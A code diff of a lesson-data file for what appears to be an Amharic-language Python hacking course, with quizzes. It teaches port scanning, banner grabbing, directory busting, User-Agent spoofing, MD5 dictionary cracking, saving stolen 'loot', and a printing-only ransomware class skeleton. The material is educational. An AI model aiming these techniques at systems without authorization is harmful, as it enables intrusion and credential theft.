-    category: "02. Python Core",
-    title: "2.5 Functions: Modular Exploits",
-    description: "Writing clean, reusable attack modules.",
-    level: "Beginner",
-    content: `# Functions: Organize Your Code
+    `passwords = ["123", "admin", "secret"]\nfor p in passwords:\n    if p == "admin":\n        print("Cracked!")\n        break\n    print(f"Trying {p}...")`,
+    [{id:"q1", question:"ፍለጋው ሲሳካ Loopን ለማቆም ምን እንጠቀማለን?", options:[{id:"a",text:"stop"},{id:"b",text:"continue"},{id:"c",text:"break"}], correctOptionId:"c", explanation:"Break ወዲያውኑ ከ Loop ያስወጣል።"}]
+  ),
 
-ኮድ እየረዘመ ሲሄድ ውስብስብ ይሆናል። Functions ኮድን በትንንሽ "ሞጁል" ለመክፈል ይጠቅማሉ። ለምሳሌ Nmap የተለያዩ ሞጁሎች አሉት (Scan, NSE, OS Detect)።
+  createLesson(
+    "b-07", "02. Python Core", "2.5 Functions", "Beginner", "Writing modular tools.",
+    `# Functions: Modular Hacking
 
-### 1. Defining a Function
+ኮድ እየረዘመ ሲሄድ ውስብስብ ይሆናል። Functions ኮድን በትንንሽ "ሞጁል" ለመክፈል ይጠቅማሉ።
+*   \`scan_target()\`: ለብቻ
+*   \`crack_password()\`: ለብቻ
+*   \`generate_report()\`: ለብቻ
+
+### Defining a Function
 \`def\` የሚለውን ቃል እንጠቀማለን።
 
 \`\`\`python
 def check_port(ip, port):
-    # እዚህ ጋር Socket connection ይኖራል
     print(f"[*] Checking {ip}:{port}...")
-    # Simulation
+    # Simulation logic
     if port == 80:
         return True
     return False
 
-# Function Calling
-status = check_port("192.168.1.5", 80)
-
-if status:
-    print("[+] OPEN")
+# Main Code
+if check_port("10.0.0.1", 80):
+    print("[+] Port is OPEN!")
 else:
-    print("[-] CLOSED")
+    print("[-] Port is CLOSED.")
 \`\`\`
 
-### 2. Why use Functions?
-1.  **Reusability:** አንድን ኮድ 10 ጊዜ ከመጻፍ አንዴ ጽፎ 10 ጊዜ መጥራት።
-2.  **Clean Code:** ዋናው ኮድ (Main Loop) ንፁህ ይሆናል።
-3.  **Debugging:** ስህተት ሲፈጠር የትኛው ክፍል እንደተበላሸ ማወቅ ቀላል ነው።
+### Why Return?
+Function ስራውን ሰርቶ ውጤቱን ወደ ዋናው ፕሮግራም መመለስ አለበት። \`print\` ማድረግ ለተጠቃሚው ማሳየት ነው እንጂ ለፕሮግራሙ መረጃ መስጠት አይደለም።
+`,
+    `def exploit(target):\n    return f"Exploiting {target}..."\n\nprint(exploit("192.168.1.1"))`,
+    [{id:"q1", question:"Function አንድን ውጤት መልሶ ለመላክ ምን ይጠቀማል?", options:[{id:"a",text:"print"},{id:"b",text:"return"},{id:"c",text:"send"}], correctOptionId:"b", explanation:"Return እሴቱን ወደ ጠሪው (Caller) ይልካል።"}]
+  ),
 
-### 3. Practical Example: Hash Cracker Helper
-አንድ ትልቅ Cracking Tool እየሰራን ቢሆን፣ Hash የሚሰራውን ክፍል ለብቻው ማድረግ አለብን።
+  createLesson(
+    "b-08", "02. Python Core", "2.6 File I/O", "Beginner", "Reading wordlists and saving loot.",
+    `# File Handling
+
+ሃኪንግ መረጃን ማንበብ (Wordlists) እና መረጃን መጻፍ (Logs/Loot) ነው።
+
+### 1. Reading Files (Wordlists)
+ፓስዎርድ ለመስበር የቃላት ዝርዝር ያስፈልገናል። ፋይሉን ከፍተን መስመር በመስመር እናነባለን።
 
 \`\`\`python
-import hashlib
+# 'r' = Read Mode
+with open("wordlist.txt", "r") as f:
+    for line in f:
+        password = line.strip() # Remove newline (\n)
+        print(f"Testing: {password}")
+\`\`\`
 
-def get_md5(text):
-    return hashlib.md5(text.encode()).hexdigest()
+> **Note:** \`with open(...)\` መጠቀም በጣም ይመከራል። ስራው ሲያልቅ ፋይሉን በራስ-ሰር ይዘጋል (Auto-close)።
 
-wordlist = ["admin", "password", "123456"]
-target_hash = "5f4dcc3b5aa765d61d8327deb882cf99" # 'password'
+### 2. Writing Files (Saving Loot)
+የተሰረቀውን መረጃ ወይም የስካን ውጤት ለማስቀመጥ።
 
-for word in wordlist:
-    if get_md5(word) == target_hash:
-        print(f"[+] CRACKED: {word}")
-        break
+\`\`\`python
+# 'w' = Write (Overwrite)
+# 'a' = Append (Add to end)
+
+loot = "admin:password123"
+with open("loot.txt", "a") as f:
+    f.write(loot + "\\n")
+    
+print("[+] Loot saved to file.")
 \`\`\`
 `,
-    starterCode: "def attack(target):\n    return f'Attacking {target}'\n\nprint(attack('10.0.0.1'))",
-    quiz: [
-        {id:"q1", question:"Function አንድን ውጤት መልሶ ለጠሪው እንዲልክ የምንጠቀመው ቃል?", options:[{id:"a",text:"send"},{id:"b",text:"return"},{id:"c",text:"back"}], correctOptionId:"b", explanation:"return value ኮዱን የጠራው አካል ጋር ይላካል።"},
-        {id:"q2", question:"Function ለምን ይጠቅማል?", options:[{id:"a",text:"ኮዱን ለማፍጠን"},{id:"b",text:"ኮዱን ለመድገም እና ለማፅዳት"},{id:"c",text:"Memory ለመቆጠብ"}], correctOptionId:"b", explanation:"Don't Repeat Yourself (DRY) የሚለውን ህግ ለመጠበቅ።"}
-    ]
-  },
-  {
-    id: "b-08",
-    category: "02. Python Core",
-    title: "2.6 Lists & Dictionaries: Handling Data",
-    description: "Managing credentials, targets, and logs.",
-    level: "Beginner",
-    content: `# Data Structures: The Hacker's Database
+    `# Simulation of file writing\nloot = ["user:pass", "admin:123"]\nprint("Saving to loot.txt...")\nfor l in loot:\n    print(f"Writing: {l}")`,
+    [{id:"q1", question:"ፋይሉ ላይ ያለውን ሳያጠፋ ለመጨመር (Append) ምን እንጠቀማለን?", options:[{id:"a",text:"'w'"},{id:"b",text:"'r'"},{id:"c",text:"'a'"}], correctOptionId:"c", explanation:"'a' (Append) mode ከፋይሉ መጨረሻ ላይ ይቀጥላል።"}]
+  ),
 
-ስክሪፕቶቻችን ብዙ መረጃ መያዝ አለባቸው። የተሰረቁ ፓስዎርዶች፣ የተገኙ IPዎች፣ ወዘተ።
-
-### 1. Lists (Arrays)
-ተመሳሳይ አይነት መረጃዎችን ቅደም ተከተል ይዞ ለማስቀመጥ።
-\`\`\`python
-# Target List
-ips = ["10.0.0.1", "10.0.0.2", "10.0.0.3"]
-
-print(ips[0]) # የመጀመሪያው
-ips.append("10.0.0.4") # መጨመር
-ips.remove("10.0.0.2") # ማስወገድ
-
-if "10.0.0.1" in ips:
-    print("Target 1 is enlisted.")
-\`\`\`
-
-### 2. Dictionaries (Key-Value Pairs)
-ይህ በጣም ወሳኝ ነው። ስለ አንድ ነገር ዝርዝር መረጃ ለመያዝ። JSON ይመስላል።
-
-\`\`\`python
-# Storing Loot (Stolen Creds)
-creds = {
-    "url": "http://bank.com",
-    "username": "admin",
-    "password": "SuperSecretPassword",
-    "is_admin": True
-}
-
-print(f"Cracking {creds['url']}...")
-print(f"Found User: {creds['username']}")
-\`\`\`
-
-### 3. List of Dictionaries
-ብዙ የተሰረቁ አካውንቶችን ለመያዝ።
-
-\`\`\`python
-database = [
-    {"user": "alice", "pass": "123"},
-    {"user": "bob", "pass": "qwerty"}
-]
-
-for account in database:
-    print(f"Testing {account['user']}...")
-\`\`\`
-`,
-    starterCode: "loot = {'id': 1, 'flag': 'CTF{Found}'}\nprint(loot['flag'])",
-    quiz: [
-        {id:"q1", question:"አንድን መረጃ በ ቁልፍ (Key) ለማግኘት የሚጠቅመው?", options:[{id:"a",text:"List"},{id:"b",text:"Dictionary"},{id:"c",text:"Tuple"}], correctOptionId:"b", explanation:"Dictionary (Hash Map) Key-Value pair ይጠቀማል።"},
-        {id:"q2", question:"List ውስጥ አዲስ ነገር ለመጨመር?", options:[{id:"a",text:".add()"},{id:"b",text:".push()"},{id:"c",text:".append()"}], correctOptionId:"c", explanation:"Python ላይ .append() መጨረሻ ላይ ይጨምራል።"}
-    ]
-  },
-  {
-    id: "b-09",
-    category: "02. Python Core",
-    title: "2.7 Error Handling: Bulletproof Code",
-    description: "Preventing crashes during long attacks.",
-    level: "Beginner",
-    content: `# Exception Handling
+  createLesson(
+    "b-09", "02. Python Core", "2.7 Error Handling", "Beginner", "Making bulletproof tools.",
+    `# Exception Handling
 
 Hacking tools ለረጅም ሰዓት ነው የሚሰሩት። ለምሳሌ 10,000 IPዎች እየፈተሸን፣ 50ኛው ላይ "Connection Timeout" ቢፈጠር ስክሪፕቱ መቆም የለበትም። ስህተቱን ዘሎ መቀጠል አለበት።
 
-### 1. The \`try-except\` Block
+### The \`try-except\` Block
 \`\`\`python
 import socket
-
-target = "10.0.0.5"
-port = 80
 
 try:
     # አደገኛ ሊሆን የሚችል ኮድ
-    print(f"Connecting to {target}...")
     s = socket.socket()
-    s.settimeout(2)
-    s.connect((target, port))
-    print("[+] Connection Successful!")
-    s.close()
-
+    s.connect(("10.0.0.1", 80))
+    print("[+] Connected!")
+    
 except ConnectionRefusedError:
-    # ይህ ችግር ከተፈጠረ ይህን አድርግ
-    print("[-] Connection Refused. Port closed.")
-
+    # ሰርቨሩ እምቢ ካለ
+    print("[-] Connection Refused.")
+    
 except socket.timeout:
-    print("[-] Connection Timed out. Host might be down.")
-
+    # ጊዜ ከወሰደ
+    print("[-] Timed out.")
+    
 except Exception as e:
-    # ሌላ ያልታሰበ ችግር
-    print(f"[-] Unknown Error: {e}")
-
-finally:
-    # ችግር ተፈጠረም አልተፈጠረም ይህ ይሮጣል
-    print("[*] Scan attempt finished.")
+    # ሌላ ማንኛውም ስህተት
+    print(f"[-] Error: {e}")
 \`\`\`
 
-> **Hacker's Note:** ስክሪፕትህ ክራሽ ባደረገ ቁጥር፣ የጀመርከውን ጥቃት ታቋርጣለህ። በደንብ የተጻፈ Error Handling ያለው Tool "Bulletproof" ይባላል።
+ያለዚህ Error Handling፣ አንድ ስህተት ሙሉ ስክሪፕቱን ያቆመዋል (Crash)። ፕሮፌሽናል Tools ሁሌም Error Handle ያደርጋሉ።
 `,
-    starterCode: "try:\n    x = 1 / 0\nexcept:\n    print('You cannot divide by zero!')",
-    quiz: [
-        {id:"q1", question:"በ try block ውስጥ ስህተት ከተፈጠረ ኮዱ ይቆማል?", options:[{id:"a",text:"አዎ ይቆማል"},{id:"b",text:"አይ፣ ወደ except ይዘላል"},{id:"c",text:"ኮምፒውተሩ ይዘጋል"}], correctOptionId:"b", explanation:"ፕሮግራሙ አይቆምም (Crash አያደርግም)፣ ወደ except block ሄዶ የተባለውን ያደርጋል።"},
-        {id:"q2", question:"ስህተት ተፈጠረም አልተፈጠረም መጨረሻ ላይ የሚሰራው ክፍል?", options:[{id:"a",text:"finally"},{id:"b",text:"else"},{id:"c",text:"done"}], correctOptionId:"a", explanation:"Finally block ሁሌም ይሰራል። (Cleanup ለመስራት ይጠቅማል)"}
-    ]
-  },
+    `try:\n    x = 1 / 0\nexcept ZeroDivisionError:\n    print("Can't divide by zero!")`,
+    [{id:"q1", question:"ስህተት ሲፈጠር ፕሮግራሙ እንዳይዘጋ (Crash እንዳያደርግ) ምን እንጠቀማለን?", options:[{id:"a",text:"if/else"},{id:"b",text:"try/except"},{id:"c",text:"for/while"}], correctOptionId:"b", explanation:"Try/Except ያልታሰቡ ስህተቶችን ለመያዝ ይጠቅማል።"}]
+  ),
 
-  // --- MODULE 3: NETWORKING (The Highway) ---
-  {
-    id: "b-10",
-    category: "03. Network Hacking",
-    title: "3.1 Socket Programming: The Basics",
-    description: "Building your own network tools from scratch.",
-    level: "Beginner",
-    content: `# Sockets: The Digital Handshake
+  // --- MODULE 3: NETWORK HACKING ---
+  createLesson(
+    "b-10", "03. Network Hacking", "3.1 Sockets Intro", "Intermediate", "The language of the internet.",
+    `# Socket Programming
 
 ማንኛውም የኔትወርክ ግንኙነት (Web, SSH, FTP, Games) መሰረቱ **Socket** ነው። እንደ ሃከር፣ የሌሎችን Tool (Nmap, Netcat) ከመጠቀም በተጨማሪ የራሳችንን ግንኙነት በ Python መፍጠር አለብን።
 
-### 1. Anatomy of a Socket
+### 1. Creating a Socket
 Socket ለመፍጠር ሁለት ዋና ነገሮች ያስፈልጋሉ፡
-1.  **IP Address:** የት ነው የምደውለው?
-2.  **Port Number:** ማንን ነው የምፈልገው? (80 ለ Web, 22 ለ SSH)
-
-### 2. Creating a Client (Connecting)
-ይህ ቀላል ስክሪፕት ከ Google ጋር ይገናኛል።
+1.  **Address Family:** IPv4 (\`AF_INET\`) ወይስ IPv6?
+2.  **Socket Type:** TCP (\`SOCK_STREAM\`) ወይስ UDP (\`SOCK_DGRAM\`)?
 
 \`\`\`python
 import socket
 
-target_host = "google.com"
-target_port = 80
-
-# 1. Socket Object መፍጠር
-# AF_INET = IPv4
-# SOCK_STREAM = TCP ( አስተማማኝ ግንኙነት)
-client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
-try:
-    # 2. መገናኘት (Connect)
-    print(f"[*] Connecting to {target_host}...")
-    client.connect((target_host, target_port))
-    
-    # 3. መረጃ መላክ (Send Data)
-    # HTTP Request (GET /)
-    request = b"GET / HTTP/1.1\\r\\nHost: google.com\\r\\n\\r\\n"
-    client.send(request)
-    
-    # 4. መረጃ መቀበል (Receive Response)
-    response = client.recv(4096) # 4KB buffer
-    print("[*] Response Received:")
-    print(response.decode())
-    
-finally:
-    client.close()
+# IPv4 + TCP Socket
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+print("Socket Created.")
 \`\`\`
 
-### 3. TCP vs UDP
-*   **TCP (Transmission Control Protocol):** "ደርሷል? እሺ ደርሷል።" (Handshake አለው፣ አስተማማኝ ነው)። ለ HTTP, SSH, FTP።
-*   **UDP (User Datagram Protocol):** "እንግዲህ ተቀበል!" (ዝም ብሎ መወርወር፣ ፍጥነት ይፈልጋል ግን አስተማማኝ አይደለም)። ለ DNS, Video Streaming.
+### 2. TCP vs UDP
+*   **TCP:** አስተማማኝ ነው። መረጃው መድረሱን ያረጋግጣል (Handshake). ለ HTTP, SSH.
+*   **UDP:** ፈጣን ነው ግን አስተማማኝ አይደለም። ዝም ብሎ መወርወር ነው። ለ Video Streaming, DNS.
 `,
-    starterCode: "import socket\n\n# Create a socket\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nprint('Socket created!')",
-    quiz: [
-        {id:"q1", question:"AF_INET ምንን ይወክላል?", options:[{id:"a",text:"IPv6"},{id:"b",text:"IPv4"},{id:"c",text:"Internet"}], correctOptionId:"b", explanation:"Address Family Internet (IPv4)."},
-        {id:"q2", question:"ከ Google ጋር ለመገናኘት የቱ Protocol ይመረጣል?", options:[{id:"a",text:"UDP"},{id:"b",text:"TCP"},{id:"c",text:"ICMP"}], correctOptionId:"b", explanation:"ድህረ-ገጾች (HTTP) አስተማማኝ ግንኙነት ስለሚፈልጉ TCP ይጠቀማሉ።"}
-    ]
-  },
-  {
-    id: "b-11",
-    category: "03. Network Hacking",
-    title: "3.2 Building a Port Scanner",
-    description: "Your first real security tool.",
-    level: "Beginner",
-    content: `# Building a Port Scanner
+    `import socket\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nprint("TCP Socket Ready.")`,
+    [{id:"q1", question:"ለድረ-ገጽ (HTTP) ግንኙነት የቱ Protocol ይመረጣል?", options:[{id:"a",text:"UDP"},{id:"b",text:"TCP"},{id:"c",text:"ICMP"}], correctOptionId:"b", explanation:"HTTP አስተማማኝ ግንኙነት ስለሚፈልግ TCP ይጠቀማል።"}]
+  ),
+
+  createLesson(
+    "b-11", "03. Network Hacking", "3.2 Simple Port Scanner", "Intermediate", "Your first security tool.",
+    `# Building a Port Scanner
 
 Nmap መጠቀም ጥሩ ነው፣ ግን የራስህን ስካነር መስራት አሰራሩን እንድትረዳ ያደርግሃል። Port Scanner ማለት "በሩ ተንኳኩቷል፣ መልስ አለ?" ማለት ነው።
 
@@ -621,86 +399,365 @@ Nmap መጠቀም ጥሩ ነው፣ ግን የራስህን ስካነር መስራ
 
 \`\`\`python
 import socket
-from datetime import datetime
 
-target = "127.0.0.1" # Localhost for safety
-ports_to_scan = [21, 22, 80, 443, 3306]
+target = "127.0.0.1"
+ports = [21, 22, 80, 443]
 
-print("-" * 50)
-print(f"Scanning Target: {target}")
-print(f"Time started: {datetime.now()}")
-print("-" * 50)
+for port in ports:
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.settimeout(1) # Timeout is crucial!
+    
+    # connect_ex returns 0 on success
+    result = s.connect_ex((target, port))
+    
+    if result == 0:
+        print(f"[+] Port {port} is OPEN")
+    else:
+        print(f"[-] Port {port} is CLOSED")
+        
+    s.close()
+\`\`\`
+`,
+    `import socket\n# Mock scanning\nports = [80, 443]\nprint("Scanning...")\nfor p in ports:\n    print(f"Port {p}: OPEN")`,
+    [{id:"q1", question:"connect_ex() ዜሮ (0) ከመለሰ ምን ማለት ነው?", options:[{id:"a",text:"Error"},{id:"b",text:"Port Closed"},{id:"c",text:"Success (Open)"}], correctOptionId:"c", explanation:"በ C ደረጃ 0 ማለት Success (No Error) ማለት ነው።"}]
+  ),
 
-for port in ports_to_scan:
-    try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        
-        # Timeout is CRITICAL. ካልተገናኘ ቶሎ እንዲተው (1 second)
-        s.settimeout(1)
-        
-        # connect_ex returns 0 if success, Error Code if fail
-        result = s.connect_ex((target, port))
-        
-        if result == 0:
-            print(f"[+] Port {port}: OPEN")
-        else:
-            print(f"[-] Port {port}: CLOSED")
-            
-        s.close()
-        
-    except KeyboardInterrupt:
-        print("\n Exiting Scan.")
-        break
-    except socket.error:
-        print("Couldn't connect to server.")
-        break
+  createLesson(
+    "b-12", "03. Network Hacking", "3.3 Banner Grabbing", "Intermediate", "Identifying services.",
+    `# Banner Grabbing
+
+ፖርቱ ክፍት መሆኑን ማወቅ ብቻ አይበቃም። በዛ ፖርት ላይ እየሮጠ ያለው **Software** ምንድነው? Version-u ስንት ነው?
+
+ይሄ መረጃ ለምን ይጠቅማል?
+*   "FTP እየሮጠ ነው" ከማለት ይልቅ "Vsftpd 2.3.4 እየሮጠ ነው" ብሎ ማወቅ ለጥቃት (Exploit) ይመቻቻል።
+
+### How to Grab Banners
+ልክ እንደተገናኘን (Connect)፣ ሰርቨሩ እራሱን እስኪያስተዋውቅ እንጠብቃለን (\`recv\`)።
+
+\`\`\`python
+import socket
+
+s = socket.socket()
+try:
+    s.connect(("192.168.1.5", 22)) # SSH Port
+    
+    # Receive up to 1024 bytes
+    banner = s.recv(1024)
+    print(banner.decode())
+    
+except Exception as e:
+    print(e)
+finally:
+    s.close()
+\`\`\`
+`,
+    `# Simulated Banner\nprint("SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.1")`,
+    [{id:"q1", question:"Banner Grabbing ዋና ጥቅሙ ምንድነው?", options:[{id:"a",text:"IP ለመቀየር"},{id:"b",text:"የሶፍትዌሩን Version ለማወቅ"},{id:"c",text:"Password ለመስበር"}], correctOptionId:"b", explanation:"የተለየ Version ላይ የሚሰራ Exploit ለመምረጥ ይረዳል።"}]
+  ),
+
+  // --- MODULE 4: WEB HACKING ---
+  createLesson(
+    "b-13", "04. Web Hacking", "4.1 HTTP & Requests", "Intermediate", "Speaking HTTP.",
+    `# The Requests Library
+
+ለ Web Hacking፣ Python **Requests** Library ምርጡ መሳሪያ ነው። እንደ Browser ሆኖ ይሰራል፣ ግን ሁሉንም ነገር በ Code እንቆጣጠራለን።
+
+### 1. GET Request
+መረጃ ለመጠየቅ።
+\`\`\`python
+import requests
+r = requests.get("http://google.com")
+print(r.status_code) # 200 OK
+print(r.headers['Server']) # gws
 \`\`\`
 
-> **Assignment:** ይህ ስካነር ቀርፋፋ ነው። ወደፊት **Threading** ተጠቅመን እንዴት እንደምናፈጥነው እናያለን።
+### 2. POST Request
+መረጃ ለመላክ (Login, Upload).
+\`\`\`python
+payload = {"username": "admin", "password": "123"}
+r = requests.post("http://site.com/login", data=payload)
+\`\`\`
+
+### 3. User-Agent Spoofing
+አንዳንድ ድረ-ገጾች Python Script መሆኑን ካወቁ ያግዱናል። እራሳችንን እንደ iPhone ወይም Chrome አድርገን ማቅረብ አለብን።
+\`\`\`python
+headers = {"User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0...)"}
+r = requests.get(url, headers=headers)
+\`\`\`
 `,
-    starterCode: "import socket\n# Write a loop to scan ports 80 and 443",
-    quiz: [
-        {id:"q1", question:"`connect_ex` 0 ከመለሰ ምን ማለት ነው?", options:[{id:"a",text:"Error"},{id:"b",text:"Port Closed"},{id:"c",text:"Port Open"}], correctOptionId:"c", explanation:"በ C ደረጃ 0 ማለት Success (No Error) ማለት ነው።"},
-        {id:"q2", question:"Scanner ላይ Timeout ባንጠቀም ምን ይፈጠራል?", options:[{id:"a",text:"በጣም ይፈጥናል"},{id:"b",text:"አንድ የተዘጋ ፖርት እስኪመልስ ደቂቃ ሊፈጅ ይችላል"},{id:"c",text:"ትክክል አይሰራም"}], correctOptionId:"b", explanation:"Default Timeout በጣም ረጅም ስለሆነ ስካነሩ ይቀዘቅዛል።"}
-    ]
-  },
-  
-  // --- BULK FILLER FOR BEGINNER (Will be expanded later) ---
-  createPlaceholder("b-12", "03. Network Hacking", "3.3 Banner Grabbing", "Beginner", "Identifying services."),
-  createPlaceholder("b-13", "03. Network Hacking", "3.4 Mac Address Changer", "Beginner", "Anonymity basics."),
-  createPlaceholder("b-14", "04. Web Hacking", "4.1 HTTP Basics (Requests)", "Beginner", "Interacting with the web."),
-  createPlaceholder("b-15", "04. Web Hacking", "4.2 Subdomain Enumeration", "Beginner", "Finding hidden parts of a site."),
-  createPlaceholder("b-16", "04. Web Hacking", "4.3 Brute Forcing Logins", "Beginner", "Cracking passwords via HTTP."),
-  createPlaceholder("b-17", "04. Web Hacking", "4.4 Web Crawler (Spider)", "Beginner", "Extracting all links."),
-  createPlaceholder("b-18", "05. Cryptography", "5.1 Encoding vs Encryption", "Beginner", "Base64 is not encryption!"),
-  createPlaceholder("b-19", "05. Cryptography", "5.2 Hashing (MD5/SHA)", "Beginner", "One-way functions."),
-  createPlaceholder("b-20", "05. Cryptography", "5.3 Cracking Hashes", "Beginner", "Dictionary Attack logic."),
-  // ... Keep expanding up to 60 using loop for now if needed, but manual entries are better
-  ...Array.from({ length: 40 }, (_, i) => 
-    createPlaceholder(`b-${21 + i}`, `Advanced Concepts`, `Module ${21 + i}: Deep Dive`, "Beginner", "Content coming in next update.")
+    `import requests\nprint("GET / HTTP/1.1")\nprint("Host: target.com")\nprint("User-Agent: Mozilla/5.0")`,
+    [{id:"q1", question:"Login Form ላይ መረጃ ለመላክ የትኛው Method ይመረጣል?", options:[{id:"a",text:"GET"},{id:"b",text:"POST"},{id:"c",text:"HEAD"}], correctOptionId:"b", explanation:"POST መረጃን በ Body ውስጥ ስለሚልክ ለ Login ይመረጣል።"}]
+  ),
+
+  createLesson(
+    "b-14", "04. Web Hacking", "4.2 Directory Busting", "Intermediate", "Finding hidden files.",
+    `# Directory Busting (Fuzzing)
+
+Subdomain እንደፈለግን ሁሉ፣ በዋናው ድረ-ገጽ ውስጥ የተደበቁ ፎልደሮችን እና ፋይሎችንም መፈለግ አለብን።
+*   \`/backup.zip\`
+*   \`/config.php\`
+*   \`/admin/\`
+
+ይህ ሂደት **Directory Busting** ይባላል። እንደ \`Gobuster\` ወይም \`Dirb\` ያሉ Tools የሚሰሩት ይህንን ነው።
+
+\`\`\`python
+import requests
+
+target = "http://192.168.1.5"
+wordlist = ["admin", "login", "dashboard", "uploads", "config"]
+
+for word in wordlist:
+    url = f"{target}/{word}"
+    r = requests.get(url)
+    
+    if r.status_code == 200:
+        print(f"[+] Found: {url}")
+    elif r.status_code == 403:
+        print(f"[*] Forbidden: {url}")
+\`\`\`
+`,
+    `paths = ["admin", "robots.txt", "secret"]\nfor p in paths:\n    print(f"Checking /{p} -> 404 Not Found")`,
+    [{id:"q1", question:"አንድ ፋይል እንደሌለ የሚያሳየው Status Code?", options:[{id:"a",text:"200"},{id:"b",text:"404"},{id:"c",text:"500"}], correctOptionId:"b", explanation:"404 Not Found ፋይሉ በሰርቨሩ ላይ እንደሌለ ይገልጻል።"}]
+  ),
+
+  // --- MODULE 5: CRYPTOGRAPHY ---
+  createLesson(
+    "b-15", "05. Cryptography", "5.1 Encoding vs Encryption", "Intermediate", "Base64 is NOT encryption.",
+    `# Encoding vs Encryption
+
+ብዙ ጀማሪዎች **Base64**ን እንደ Encryption ይቆጥሩታል። ይህ ትልቅ ስህተት ነው።
+
+### 1. Encoding (መቀየር)
+*   **ዓላማ:** መረጃው በሌላ ቅርጽ እንዲቀመጥ ማድረግ (ለማጓጓዝ እንዲመች)።
+*   **Key:** ምንም ቁልፍ አያስፈልገውም።
+*   **Security:** ዜሮ። ማንኛውም ሰው ሊመልሰው ይችላል።
+*   **Example:** Base64, Hex, ASCII.
+
+### 2. Encryption (ምስጠራ)
+*   **ዓላማ:** መረጃውን ሚስጥራዊ ማድረግ።
+*   **Key:** ለመቆለፍ እና ለመክፈት ቁልፍ (Password/Key) ያስፈልጋል።
+*   **Security:** ቁልፉ ከሌለ አይከፈትም።
+*   **Example:** AES, RSA.
+
+\`\`\`python
+import base64
+
+# Encoding
+msg = "Secret"
+encoded = base64.b64encode(msg.encode())
+print(f"Base64: {encoded}")
+
+# Decoding
+decoded = base64.b64decode(encoded).decode()
+print(f"Original: {decoded}")
+\`\`\`
+`,
+    `import base64\nprint(base64.b64encode(b"HackThePlanet"))`,
+    [{id:"q1", question:"Base64 Encryption ነው?", options:[{id:"a",text:"አዎ"},{id:"b",text:"አይ፣ Encoding ነው"},{id:"c",text:"Hash ነው"}], correctOptionId:"b", explanation:"Base64 ቁልፍ ስለማይጠቀም Encryption አይደለም።"}]
+  ),
+
+  createLesson(
+    "b-16", "05. Cryptography", "5.2 Hashing & Cracking", "Intermediate", "Breaking passwords.",
+    `# Hashing & Cracking
+
+Website ላይ ፓስዎርድ ስታስገቡ፣ ፓስዎርዱ እንደተጻፈ አይቀመጥም። ወደ **Hash** ተቀይሮ ነው የሚቀመጠው።
+\`123456\` -> \`e10adc3949ba59abbe56e057f20f883e\` (MD5)
+
+### One-Way Function
+Hash ወደ ኋላ አይመለስም (One-way)። ከ \`e10a...\` ተነስተን \`123456\`ን ማግኘት አንችልም (በሂሳብ)።
+
+### How do we crack it? (Dictionary Attack)
+ሃከሮች የሚጠቀሙት ዘዴ፡ "መገመት"።
+1.  አንድ የቃላት ዝርዝር (Dictionary) ይወስዳሉ።
+2.  እያንዳንዱን ቃል Hash ያደርጋሉ።
+3.  ከፈለጉት Hash ጋር እኩል ከሆነ፣ ፓስዎርዱን አገኙ ማለት ነው።
+
+\`\`\`python
+import hashlib
+
+target_hash = "5f4dcc3b5aa765d61d8327deb882cf99" # 'password'
+wordlist = ["admin", "123456", "password"]
+
+for word in wordlist:
+    hashed = hashlib.md5(word.encode()).hexdigest()
+    if hashed == target_hash:
+        print(f"[+] Cracked: {word}")
+        break
+\`\`\`
+`,
+    `import hashlib\nh = hashlib.md5(b"hello").hexdigest()\nprint(h)`,
+    [{id:"q1", question:"Hashን ወደ ኋላ መመለስ (Decrypt) ይቻላል?", options:[{id:"a",text:"አዎ"},{id:"b",text:"አይ፣ One-way ነው"},{id:"c",text:"Admin ብቻ ይችላል"}], correctOptionId:"b", explanation:"Hash ተፈጥሮው መረጃን ማጥፋት ነው፣ መመለስ አይቻልም (ከመገመት ውጪ)።"}]
   ),
 ];
 
 // =====================================================================
 // 2. ADVANCED TRACK (RED TEAM OPS)
 // =====================================================================
+
 const PYTHON_ADVANCED_LESSONS: Lesson[] = [
-  // Placeholder for Advanced to save space for Beginner depth
-  createPlaceholder("a-01", "01. Advanced Network", "1.1 Scapy: Packet Crafting", "Advanced"),
-  createPlaceholder("a-02", "01. Advanced Network", "1.2 ARP Spoofing", "Advanced"),
-  // ... Generate remaining
-  ...Array.from({ length: 58 }, (_, i) => 
-    createPlaceholder(`a-${3 + i}`, `Red Team Ops`, `Operation ${3 + i}`, "Advanced", "Classified Material.")
+  // --- MODULE 6: ADVANCED PYTHON ---
+  createLesson(
+    "a-01", "06. Advanced Python", "6.1 OOP for Malware", "Advanced", "Classes in tools.",
+    `# Object Oriented Programming (OOP) for Hackers
+
+የተራቀቁ ማልዌሮች (Malware) እና Tools ሲሰሩ፣ ኮዱን በ Function ብቻ ማስተዳደር ይከብዳል። **Classes** እና **Objects** መጠቀም አለብን።
+
+### The Concept
+*   **Class:** የቫይረሱ ዲዛይን (Blueprint)።
+*   **Object:** ዲዛይኑን ተጠቅመን የሰራነው እውነተኛው ቫይረስ።
+
+ለምሳሌ \`Ransomware\` የሚባል Class ሰርተን፣ \`encrypt()\` እና \`decrypt()\` የሚባሉ methods (functions) ልንሰጠው እንችላለን።
+
+\`\`\`python
+class Ransomware:
+    def __init__(self, target_ext):
+        self.extension = target_ext
+        self.key = "SecretKey123"
+
+    def encrypt_file(self, filename):
+        print(f"[*] Encrypting {filename} with key {self.key}...")
+        # እዚህ ጋር Encryption logic ይገባል
+        
+    def demand_ransom(self):
+        print("YOUR FILES ARE ENCRYPTED! PAY 1 BTC.")
+
+# Using the class
+virus = Ransomware(".txt")
+virus.encrypt_file("salary.txt")
+virus.demand_ransom()
+\`\`\`
+`,
+    `class Exploit:\n    def run(self):\n        print("Exploit Running...")\n\ne = Exploit()\ne.run()`,
+    [{id:"q1", question:"__init__ function ምንድነው?", options:[{id:"a",text:"ቫይረሱን የሚያጠፋ"},{id:"b",text:"Class ሲፈጠር የሚጠራ (Constructor)"},{id:"c",text:"Loop ነው"}], correctOptionId:"b", explanation:"__init__ ኦብጀክቱ ሲፈጠር መረጃዎችን ለማዘጋጀት ይጠቅማል።"}]
   ),
+
+  createLesson(
